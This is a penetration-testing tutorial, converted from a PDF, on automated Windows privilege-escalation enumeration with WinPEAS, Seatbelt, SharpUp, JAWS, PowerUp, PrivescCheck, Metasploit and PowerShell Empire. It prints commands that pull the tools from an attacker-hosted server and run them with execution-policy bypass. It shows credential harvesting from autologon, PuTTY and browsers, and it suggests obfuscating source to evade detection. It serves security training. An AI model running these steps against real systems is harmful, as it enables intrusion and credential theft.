---
title: "Window Privilege Escalation - Automated Script"
source: Redteam Kit
converted: 2026-06-29T14:07:47+03:00
type: redteam-reference
---

Window Privilege Escala�on: Automated Script




                               1|Page
                                                                                  Window Privilege Escalation: Automated Script



Contents
Introduc�on ............................................................................................................................................ 3
Privilege Escala�on Vectors..................................................................................................................... 3
Ge�ng Access on Windows Machine ..................................................................................................... 3
WinPEAS .................................................................................................................................................. 4
Seat Belt ................................................................................................................................................ 10
SharpUp ................................................................................................................................................ 13
JAWS – Just Another Windows (Enum) Script ....................................................................................... 16
PowerUp................................................................................................................................................ 17
Powerless .............................................................................................................................................. 20
Privesccheck .......................................................................................................................................... 22
Metasploit: Windows-Exploit-Suggester ............................................................................................... 25
Metasploit: Sherlock ............................................................................................................................. 25
Metasploit: WinPEAS/SharpUp/Seatbelt .............................................................................................. 27
PowerShell Empire: WinPEAS ............................................................................................................... 28
PowerShell Empire: PowerUp ............................................................................................................... 30
PowerShell Empire: Sherlock ................................................................................................................ 32
PowerShell Empire: Watson .................................................................................................................. 34
PowerShell Empire: Privesccheck.......................................................................................................... 35
Conclusion ............................................................................................................................................. 37




                                                                                                                                        2|Page
                                                     Window Privilege Escalation: Automated Script


Introduction
In this ar�cle, we will shed light on some of the automated scripts that can be used to perform Post
Exploita�on and Enumera�on a�er ge�ng ini�al accesses to Windows OS based Devices.

When an atacker atacks a Windows Opera�ng System most of the �me they will get a base shell or
meterpreter session. This shell is limited in the ac�ons it can perform. So, in order to elevate
privileges, we need to enumerate diﬀerent ﬁles, directories, permissions, logs and SAM ﬁles. The
number of ﬁles inside a Windows OS is very overwhelming. Hence, doing this task manually is very
diﬃcult even when you know where to look. So, why not automate this task using scripts.

Basically, privilege escala�on is a phase that comes a�er the atacker has compromised the vic�m’s
machine where he tries to gather cri�cal informa�on related to systems such as hidden password
and weak conﬁgured services or applica�ons and etc. All this informa�on helps the atacker to make
the post exploit against the machine for ge�ng the higher-privileged shell.


Privilege Escalation Vectors
Following informa�on are considered as cri�cal Informa�on of Windows System:

    •   The version of the opera�ng system
    •   Any Vulnerable package installed or running
    •   Files and Folders with Full Control or Modify Access
    •   Mapped Drives
    •   Poten�ally Interes�ng Files
    •   Unquoted Service Paths
    •   Network Informa�on (interfaces, arp, netstat)
    •   Firewall Status and Rules
    •   Running Processes
    •   AlwaysInstallElevated Registry Key Check
    •   Stored Creden�als
    •   DLL Hijacking
    •   Scheduled Tasks

Several scripts are used in penetra�on tes�ng to quickly iden�fy poten�al privilege escala�on vectors
on Windows systems, and today we will elaborate on each script that works smoothly.


Getting Access on Windows Machine
This step is for maintaining con�nuity and for beginners. If you are more of an intermediate or expert
then you can skip this and get onto the scripts directly. Or if you have got the session through any
other exploit then also you can skip this sec�on.

We must ﬁrst exploit the machine because we are discussing post-exploita�on or scripts that can be
used to list the circumstances or opportuni�es to escalate privileges. It's a rather straigh�orward
method. First, we use MSFvenom to create a payload. The windows/x64/shell_reverse_tcp exploit
will be employed. We made this decision so that, instead of a meterpreter, we would receive a shell
upon execu�on. Later on, we shall talk about the meterpreter method. We will supply our local IP
address and the port on which we an�cipate receiving the session in addi�on to the exploit. We must
indicate that the payload is being cra�ed in an executable format because we are aiming for a

                                                                                        3|Page
                                                     Window Privilege Escalation: Automated Script


Windows computer. A�er successfully cra�ing the payload, we run a python one line to host the
payload on our port 80. We will use this to download the payload on the target system.




A�er downloading the payload on the system, we start a netcat listener on the local port that we
men�oned while cra�ing the payload. Then execute the payload on the target machine. You will get
a session on the target machine.

Refer to our MSFvenom Ar�cle to Learn More.


WinPEAS
GitHub Link: WinPEAS

Let’s start with WinPEAS. It was created by Carlos P. It was made with a simple objec�ve that is to
enumerate all the possible ways or methods to Elevate Privileges on a Windows System. You can
download an executable ﬁle or a batch ﬁle from GitHub. The source code is also available if you are
interested in building it on your own. Just make sure to have .Net version 4.5 or above. You could
also take the source code and obfuscate it so as to make your ac�vi�es undetected. All available on
GitHub. One of its features is that the output presented by WinPEAS is full of colours, which makes it
easier for the eyes to detect something poten�ally interes�ng. The color code details are: Red means
that a special privilege is detected, Green is some protec�on or defence is enabled. Cyan shows the
ac�ve users on the machine. Blue shows the disabled users and Yellow shows links. There are other
colors as well. Each with a diﬀerent meaning. The WinPEAS is heavily based on Seatbelt. WinPEAS
can detect or test the following conﬁgura�ons or loca�ons:

System Informa�on

Basic System info informa�on, Use Watson to search for vulnerabili�es, Enumerate Microso�
updates, PS, Audit, WEF and LAPS Se�ngs, LSA protec�on, Creden�al Guard, WDigest, Number of
cached creds, Environment Variables, Internet Se�ngs, Current drives informa�on, AV, Windows
Defender, UAC conﬁgura�on, NTLM Se�ngs, Local Group Policy, AppLocker Conﬁgura�on & bypass
sugges�ons, Printers, Named Pipes, AMSI Providers, Sysmon, .NET Versions

Users Informa�on

Users informa�on, Current token privileges, Clipboard text, Current logged users, RDP sessions, ever
logged users, Autologin creden�als, Home folders, Password policies, Local User details, Logon
Sessions

Services Informa�on

Interes�ng services (non-Microso�) informa�on, Modiﬁable services, Writable service registry
binpath, PATH Dll Hijacking


                                                                                         4|Page
                                                     Window Privilege Escalation: Automated Script


Applica�ons Informa�on

Current Ac�ve Window, Installed so�ware, Autoruns, Scheduled tasks, Device drivers

Network Informa�on

Current net shares, Mapped drives (WMI), hosts ﬁle, Network Interfaces, Listening ports, Firewall
rules, DNS Cache, Internet Se�ngs

Windows Creden�als

Windows Vault, Creden�al Manager, Saved RDP se�ngs, recently run commands, Default PS
transcripts ﬁles, DPAPI Master keys, DPAPI Creden�al ﬁles, Remote Desktop Connec�on Manager
creden�als, Kerberos Tickets, Wi-Fi, AppCmd.exe, SSClient.exe, SCCM, Security Package Creden�als,
AlwaysInstallElevated, WSUS

Browser Informa�on

Firefox DBs, Creden�als in Firefox history, Chrome DBs, Creden�als in chrome history, Current IE tabs,
Creden�als in IE history, IE Favorites, Extrac�ng saved passwords for: Firefox, Chrome, Opera, Brave

Interes�ng Files and registry

Puty sessions, Puty SSH host keys, Super PuTTY info, Oﬃce365 endpoints synced by OneDrive, SSH
Keys inside registry, Cloud creden�als Check for unatended ﬁles, Check for SAM & SYSTEM backups,
Check for cached GPP Passwords, Check for and extract creds from MacAfee SiteList.xml ﬁles,
Possible registries with creden�als, Possible creden�als ﬁles in users homes, Possible password ﬁles
inside the Recycle bin, Possible ﬁles containing creden�als, User documents, Oracle SQL Developer
conﬁg ﬁles check, Slack ﬁles search, Outlook downloads, Machine and user cer�ﬁcate ﬁles, Oﬃce
most recent documents, Hidden ﬁles and folders, Executable ﬁles in non-default folders with write
permissions, WSL check

Events Informa�on

Logon + Explicit Logon Events, Process Crea�on Events, PowerShell Events, Power On/Oﬀ Events

Addi�onal Checks

LOLBAS search, run linpeas.sh in default WSL distribu�on.

That’s something. I can’t think of any other method or conﬁgura�on that this tool hasn’t checked. To
use it, we will have to download the executable from GitHub. We are using an executable ﬁle as we
faced some errors with the batch ﬁle. We downloaded it into our Kali Linux. Now we host the ﬁle
using a Python One line.

python -m SimpleHTTPServer 80




                                                                                        5|Page
                                                  Window Privilege Escalation: Automated Script




Downloading and Execu�ng WinPEAS

We have our shell from the previous Sec�on. Here, we proceeded to create a Temp folder and then
used the IWR a.k.a Invoke-Web Request to download WinPEAS to this machine. Then execute it
directly from the shell as shown in the image below.

powershell.exe -command IWR -Uri http://192.168.1.2/winPEAS.exe -OutFile
C:\Temp\winPEAS.exe "




                                                                                    6|Page
                                                      Window Privilege Escalation: Automated Script




Ini�al Enumera�on Findings

Various tests have begun on the system. We can see WinPEAS enumera�ng through the Clipboard
data. In this age of Password Managers, it is very probable that there are some creden�als that are
copied by the vic�m, and it just stayed there. This is the recipe for account compromise. Hence
always enables 2FA so that you can be protected by such breaches. Moving on to the other results
we can see that there are 2 logged users on the target machine. It also checks for the users in the
Home Folder and then con�nues to try and access the Home Folder of other user and then reverts
into the result about the level of access on that user. It has successfully extracted the password from
the Auto Logon for the user “user”. Then it moves on to read the password policies enabled. It tells
us which user has not changed their passwords in a long dura�on of �me and what the length of the
password of that user is.




                                                                                          7|Page
                                                   Window Privilege Escalation: Automated Script




Then, it moves onto the Network Shares on the target machine. It checks for the network
conﬁgura�ons and IP Addresses. Then it checks the local ports for the services as well.




                                                                                      8|Page
                                                       Window Privilege Escalation: Automated Script




It lists a large number of intriguing ﬁles and registry variables. It indicates that the password was also
taken out of the PuTTY session. If there are any public keys, it can also extract them. SAM is listed for



                                                                                            9|Page
                                                      Window Privilege Escalation: Automated Script


poten�al qualiﬁca�ons. It listed an encrypted password from an XML ﬁle called Unatend.xml, as we
can see.




Seat Belt
GitHub Link: Seat Belt

We just men�oned Seatbelt project when we talked about the WinPEAS. Seatbelt is built in C#. The
basic process of enumera�on is quite like that we just discussed. But it will not provide you with an
executable. You will have to build it. It’s quite a simple process. We strongly advise that you build it
on your own and not download any pre-exis�ng executable available online. Download the Seatbelt
ﬁles from GitHub. Just open Visual Studio Community. Choose Open a Project or Solu�on. Then
direct the path to the Seatbelt.sln ﬁle. It will load into Visual Studio. Then click on the Build Menu
from the Top Menu bar and then choose Build Solu�on from the drop-down menu. That’s it. You can
check the output window for the loca�on of the binary you just built. At this point, we assume that
you have built your executable, and you have a session on a Windows Machine. Transfer the
executable with your choice of method. Seatbelt provides an insight into the following sec�ons:

Building and Transferring Seatbelt

An�virus, AppLocker Se�ngs, ARP table and Adapter informa�on, Classic and advanced audit policy
se�ngs, Autorun executables/scripts/programs, Browser(Chrome/Edge/Brave/Opera) Bookmarks,
Browser History, AWS/Google/Azure/Bluemix Cloud creden�al ﬁles, All conﬁgured Oﬃce 365
endpoints which are synchronized by OneDrive, Creden�al Guard conﬁgura�on, DNS cache entries,
Dot Net versions, DPAPI master keys, Current environment %PATH$ folders, Current environment
variables, Explicit Logon events (Event ID 4648) from the security event log, Explorer most recently
used ﬁles, Recent Explorer "run" commands, FileZilla conﬁgura�on ﬁles, Installed ho�ixes, Installed,
"Interes�ng" processes like any defensive products and admin tools, Internet se�ngs including proxy
conﬁgs and zones conﬁgura�on, KeePass conﬁgura�on ﬁles, Local Group Policy se�ngs, Non-empty
local groups, Local users, whether they're ac�ve/disabled, Logon events (Event ID 4624), Windows



                                                                                           10 | P a g e
                                                    Window Privilege Escalation: Automated Script


logon sessions, Locates Living Oﬀ The Land Binaries and Scripts (LOLBAS) on the system and other
informa�on.

Execu�ng Seatbelt for Enumera�on

impacket-smbserver share $(pwd) -smb2support
copy \\192.168.1.2\share\Seatbelt.exe
Seatbelt.exe -group=all




We can run speciﬁc commands and to speciﬁc groups. Here, we just executed all the commands
using all keyword. It started enumera�ng all the things that we just told you about.




                                                                                      11 | P a g e
                                                     Window Privilege Escalation: Automated Script




As clearly visible that when seatbelt enumerated the Auto Logon, it found a set of creden�als. It was
previously found by WinPEAS as well.




                                                                                        12 | P a g e
                                                         Window Privilege Escalation: Automated Script




SharpUp
GitHub Link: SharpUp

From one C# script to another, we now take a look at the SharpUp script. It was developed by
Harmj0y. There is no binary readily available for it as well. But it is possible to build it using a similar
process as we did with Seatbelt. SharpUp imports are various of its func�onality from another tool
called PowerUp. We will talk in-depth about it later. Again, we will transfer the executable to the

                                                                                               13 | P a g e
                                                      Window Privilege Escalation: Automated Script


target machine using a similar process as we did earlier and run it directly from the terminal. It
detects the following:

Modiﬁable Services, Modiﬁable Binaries, AlwaysInstallElevated Registry Keys, Modiﬁable Folders in
%PATH%, Modiﬁable Registry Autoruns, Special User Privileges if any and McAfee Sitelist.xml ﬁles.

python -m SimpleHTTPServer 80
powershell.exe iwr -uri 192.168.1.2/SharpUp.exe -o C:\Temp\SharpUp.exe




                                                                                           14 | P a g e
Window Privilege Escalation: Automated Script




                                15 | P a g e
                                                    Window Privilege Escalation: Automated Script


JAWS – Just Another Windows (Enum) Script
GitHub Link: JAWS

Surﬁng through one C# binary to another, we are ﬁnally atacked by JAWS. It is a PowerShell script for
a change. As it was developed on PowerShell 2.0 it is possible to enumerate Windows 7 as well. It
can work and detect the following:

Network Informa�on (interfaces, arp, netstat), Firewall Status and Rules, Running Processes, Files
and Folders with Full Control or Modify Access, Mapped Drives, Poten�ally Interes�ng Files,
Unquoted Service Paths, Recent Documents, System Install Files, AlwaysInstallElevated Registry Key
Check, Stored Creden�als, Installed Applica�ons, Poten�ally Vulnerable Services, MUICache Files,
Scheduled Tasks

Since it is a PowerShell script, you might need to make appropriate changes in the Execu�on Policy to
execute it.

powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1




Here, we can see the various MUICache Files that the JAWS extracted with the Stored creden�als as
well. It also has enumerated the Auto Logon creden�als.




                                                                                        16 | P a g e
                                                    Window Privilege Escalation: Automated Script




PowerUp
GitHub Link: PowerUp

PowerUp is another PowerShell script that works on enumera�ng methods to elevate privileges on
Windows System. It has an Invoke-AllChecks op�on that will represent any iden�ﬁed vulnerabili�es
with abuse func�ons as well. It is possible to export the result of the scan using -HTMLREPORT ﬂag.

PowerUp detects the following Privileges:

                                                                                        17 | P a g e
                                                    Window Privilege Escalation: Automated Script


Token-Based Abuse, Services Enumera�on and Abuse, DLL Hijacking, Registry Checks, etc.

To use the PowerUp, we need to transfer the script to the Target Machine using any method of your
choice. Then bypass the Execu�on Policy to execute the script from PowerShell. Then use the Invoke-
AllChecks in order to execute PowerUp on the target machine. We can see it has already provided us
with some Unquoted Path Files that can be used to elevate privilege.

powershell
powershell -ep bypass
Import-Module .\PowerUp.ps1
Invoke-AllChecks




                                                                                      18 | P a g e
                                                     Window Privilege Escalation: Automated Script




It has extracted creden�als for the user using the Autorun Executable. It has also provided the
Registry key associated with the user.




                                                                                         19 | P a g e
                                                     Window Privilege Escalation: Automated Script




Powerless
GitHub Link: Powerless

Many legacy Windows machines have the problem that users cannot access PowerShell and cannot
run executable ﬁles. But we need to enumerate the possibili�es for it as well to elevate privileges.
Powerless come to the rescue here. All you must do is transfer the batch ﬁle to the target machine
through the method of your choice and then execute it. It will work and will provide data about the
methods and directories that the target machine can use to elevate privileges.




                                                                                        20 | P a g e
Window Privilege Escalation: Automated Script




                                21 | P a g e
                                                    Window Privilege Escalation: Automated Script


Privesccheck
GitHub Link: Privesccheck

Another PowerShell script enumerates common Windows conﬁgura�on issues that can be used for
local privilege escala�on. It can also serve as a great tool for post-exploita�on. During
worksta�on/VDI audits and penetra�on tests, developers created this applica�on to assist security
consultants in loca�ng possible vulnerabili�es on Windows computers. They designed it to
enumerate rapidly and without the need for any outside tools. There aren't many dependencies. It is
appropriate for usage in se�ngs that mandate applica�on whitelis�ng, such as AppLocker.
Addi�onally, because admin users can limit it, they do not need the WMI. We move the script ﬁle to
the des�na�on computer using your preferred manner so that you can u�lize it. Next, run it without
following the execu�on policy.

powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"




                                                                                      22 | P a g e
                                                       Window Privilege Escalation: Automated Script




We can see that it is targe�ng diﬀerent services and trying to test if they are vulnerable or not. It is
also checking that service with diﬀerent users, Access Rights. It also checks if the current user is able
to access that par�cular service or not.




                                                                                            23 | P a g e
                                                     Window Privilege Escalation: Automated Script




Finally, it can generate a report for all the scanning it did. This report sorts the diﬀerent
vulnerabili�es based on the risk and indicates whether the applica�on or service is too vulnerable or
not.




                                                                                        24 | P a g e
                                                     Window Privilege Escalation: Automated Script




Metasploit: Windows-Exploit-Suggester
Now that we have diﬀerent tools and scripts discussed we can turn them over to the Metasploit.
There are moments where instead of a base shell you have yourself a meterpreter shell. This is
where we can use the in-built post-exploita�on module to enumerate various methods to elevate
privilege on the target system.




Metasploit: Sherlock
Sherlock is one of the oldest scripts that were so extensively used that Metasploit decided to include
it in its post-exploita�on framework. It requires PowerShell. When you do have the meterpreter on
the target machine, use the load powershell command to get the PowerShell proper�es on that
par�cular shell. Then use the import func�on to run the Sherlock on that meterpreter session. It will
run and scan the target machine for vulnerabili�es and return the ones that are most probable to
work to elevate privileges. It will return CVE details of the exploits as well.

                                                                                         25 | P a g e
                                       Window Privilege Escalation: Automated Script


load powershell
powershell_import /root/Sherlock.ps1
powershell_execute "find-allvulns"




                                                                       26 | P a g e
                                                    Window Privilege Escalation: Automated Script


Metasploit: WinPEAS/SharpUp/Seatbelt
In the scenario, where you have the meterpreter on the target machine and you want to run the best
tools such as Seatbelt or SharpUp or WinPEAS, you can do that by following this procedure. We will
create a directory. Then use the upload command to transfer the induvial script or executables. Then
just pop the cmd using the shell command. This will enable you to execute the executables or scripts
directly on the system.

mkdir privs
cd privs
upload /root/Downloads/Seatbelt.exe
upload /root/Downloads/SharpUp.exe
upload /root/Downloads/WinPEAS.exe
shell
WinPEAS.exe
SharpUp.exe
Seatbelt.exe




In the previous step, we executed WinPEAS star�ng from a meterpreter shell. We can see that it is
working properly with the colours that we discussed earlier. IT tells us about the Basic System
Informa�on. It even detects that it is a Virtual Machine. Using the build number of the target
machine detects the exploits that it is vulnerable to.




                                                                                       27 | P a g e
                                                   Window Privilege Escalation: Automated Script




PowerShell Empire: WinPEAS
Moving on from the Metasploit, if you prefer to use the PowerShell Empire as a tool to compromise
the target machine and now are looking for a method to elevate those privileges then there is a
WinPEAS script present inside the PowerShell Empire. We select the Agent and then select the
module and execute the script on the selected Agent.

usemodule privesc/WinPEAS
execute




                                                                                     28 | P a g e
                                                   Window Privilege Escalation: Automated Script




As the WinPEAS starts running on the target machine, we can see the Network Interfaces that the
target machine is interac�ng with. It inspects the TCP connects as well.




                                                                                     29 | P a g e
                                                      Window Privilege Escalation: Automated Script


WinPEAS performs eﬀec�vely when it comes to extrac�ng users and Group Policies. Addi�onally, it
will extract any passwords that are cached. It's possible that a program with creden�als will extract
them for you if it exists. If not, it will s�ll display the ﬁle loca�on that may contain the login
informa�on.




PowerShell Empire: PowerUp
We already worked with PowerUp earlier in this ar�cle but what we did was to execute it directly on
the shell. This �me we will use it from the PowerShell Empire. It provides more stability and is faster
on execu�on. The basic checks are the same that we observed earlier but now we just executed it on
an Agent using the following commands.

usemodule privesc/powerup/allchecks
execute




                                                                                          30 | P a g e
                                                     Window Privilege Escalation: Automated Script




As before a�er working for a while, it got on to the Auto Logon, there it found the creden�als for the
user. It also found the Path for the autorun conﬁgs. A�er extrac�ng these, it goes on to enumerate
the schedule tasks as shown in the image below.




                                                                                         31 | P a g e
                                                     Window Privilege Escalation: Automated Script




PowerShell Empire: Sherlock
Once you eliminate the impossible, whatever remains, no mater how improbable, must be the
truth. With that supreme quote we are in the mood for execu�ng Sherlock to the target machine
which will snoop for the clues that will help us to elevate privileges on the target machine. We have
deployed Sherlock before as well but we did that directly on the shell but this �me we have changed
the scenario a bit. Instead of the shell we now have an Agent ac�ve on the target machine through
PowerShell Empire. We will just select the Agent and select the module and execute it.

usemodule privesc/sherlock
execute




                                                                                        32 | P a g e
Window Privilege Escalation: Automated Script




                                33 | P a g e
                                                  Window Privilege Escalation: Automated Script


PowerShell Empire: Watson
There cannot be a Sherlock without a Watson. There is another module inside the PowerShell Empire
that can enumerate the possible vulnerabili�es to elevate privileges on the target machine by the
name of Watson. It enumerates on the basis of build number and can return the CVE ID to easily
exploit the machine and get Administrator Access.

usemodule privesc/watson
execute




                                                                                    34 | P a g e
                                                  Window Privilege Escalation: Automated Script


PowerShell Empire: Privesccheck
At last, we come to the Privesccheck script. The developers have also integrated it with the
PowerShell Empire Framework to provide easy access upon exploi�ng a Windows Based Machine.
We perform all the checks that we discussed previously, but the only change is that now we are
loading it as a module to be ac�vated on an ac�ve Agent inside the PowerShell Empire.

usemodule privesc/privesccheck
execute




                                                                                    35 | P a g e
                                                       Window Privilege Escalation: Automated Script


We can see that it is targe�ng diﬀerent services and trying to test if they are vulnerable or not. It is
also checking that service with diﬀerent users, Access Rights. It also checks if the current user can
access that service or not.




                                                                                             36 | P a g e
                                                   Window Privilege Escalation: Automated Script


Conclusion
The point that we are trying to convey through this ar�cle is that there are mul�ple scripts and
executables and batch ﬁles to consider while doing Post Exploita�on on Windows-Based devices. We
wanted this ar�cle to serve as your go-to guide whenever you are trying to elevate privilege on a
Windows machine irrespec�ve of the way you got your ini�al foothold.




                                                                                     37 | P a g e
                  JOIN OUR
             TRAINING PROGRAMS
       H  ERE
 CLICK                              BEGINNER


                                        Bug Bounty                        Network Security
 Ethical Hacking                                                             Essentials

                    Network Pentest
                                                       Wireless Pentest




                                    ADVANCED



Burp Suite Pro              Web                          Pro                     Computer
                        Services-API            Infrastructure VAPT              Forensics


                                         Advanced                     CTF
           Android Pentest              Metasploit




                                        EXPERT

            Red Team Operation

                                                     Privilege Escalation
         APT’s - MITRE Attack Tactics
                                                                      Windows
          Active Directory Attack
                                                                      Linux
         MSSQL Security Assessment




www.ignitetechnologies.in
